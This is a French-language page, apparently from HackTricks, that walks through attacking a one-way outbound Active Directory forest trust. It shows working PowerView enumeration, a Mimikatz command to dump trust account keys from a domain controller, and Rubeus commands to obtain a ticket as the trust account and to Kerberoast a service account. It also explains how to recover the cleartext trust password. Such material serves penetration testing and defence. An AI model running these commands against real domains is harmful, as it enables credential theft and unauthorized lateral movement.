# Domaine de la forêt externe - Sortant à sens unique

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Dans ce scénario, **votre domaine** accorde **certains privilèges** à un principal provenant de **domaines différents**.

## Énumération

### Confiance sortante
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Attaque du compte de confiance

Une vulnérabilité de sécurité existe lorsqu'une relation de confiance est établie entre deux domaines, identifiés ici comme le domaine **A** et le domaine **B**, où le domaine **B** étend sa confiance au domaine **A**. Dans cette configuration, un compte spécial est créé dans le domaine **A** pour le domaine **B**, qui joue un rôle crucial dans le processus d'authentification entre les deux domaines. Ce compte, associé au domaine **B**, est utilisé pour chiffrer les tickets permettant d'accéder aux services à travers les domaines.

L'aspect critique à comprendre ici est que le mot de passe et le hash de ce compte spécial peuvent être extraits d'un Contrôleur de Domaine dans le domaine **A** en utilisant un outil en ligne de commande. La commande pour effectuer cette action est :
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Cette extraction est possible car le compte, identifié par un **$** après son nom, est actif et appartient au groupe "Domain Users" du domaine **A**, héritant ainsi des autorisations associées à ce groupe. Cela permet aux individus de s'authentifier contre le domaine **A** en utilisant les identifiants de ce compte.

**Attention :** Il est possible de tirer parti de cette situation pour obtenir un point d'entrée dans le domaine **A** en tant qu'utilisateur, bien que avec des autorisations limitées. Cependant, cet accès est suffisant pour effectuer une énumération sur le domaine **A**.

Dans un scénario où `ext.local` est le domaine faisant confiance et `root.local` est le domaine de confiance, un compte utilisateur nommé `EXT$` serait créé dans `root.local`. À l'aide d'outils spécifiques, il est possible de décharger les clés de confiance Kerberos, révélant les identifiants de `EXT$` dans `root.local`. La commande pour y parvenir est :
```bash
lsadump::trust /patch
```
Suivant cela, on pourrait utiliser la clé RC4 extraite pour s'authentifier en tant que `root.local\EXT$` au sein de `root.local` en utilisant une autre commande d'outil :
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Cette étape d'authentification ouvre la possibilité d'énumérer et même d'exploiter des services au sein de `root.local`, comme réaliser une attaque Kerberoast pour extraire les identifiants de compte de service en utilisant :
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Collecte du mot de passe de confiance en texte clair

Dans le flux précédent, le hachage de confiance a été utilisé à la place du **mot de passe en texte clair** (qui a également été **extrait par mimikatz**).

Le mot de passe en clair peut être obtenu en convertissant la sortie \[ CLEAR ] de mimikatz de l'hexadécimal et en supprimant les octets nuls '\x00':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Parfois, lors de la création d'une relation de confiance, un mot de passe doit être saisi par l'utilisateur pour la confiance. Dans cette démonstration, la clé est le mot de passe de confiance d'origine et donc lisible par l'homme. Comme la clé change (tous les 30 jours), le texte en clair ne sera pas lisible par l'homme mais techniquement toujours utilisable.

Le mot de passe en clair peut être utilisé pour effectuer une authentification régulière en tant que compte de confiance, une alternative à la demande d'un TGT en utilisant la clé secrète Kerberos du compte de confiance. Ici, interroger root.local depuis ext.local pour les membres des administrateurs de domaine:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Références

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
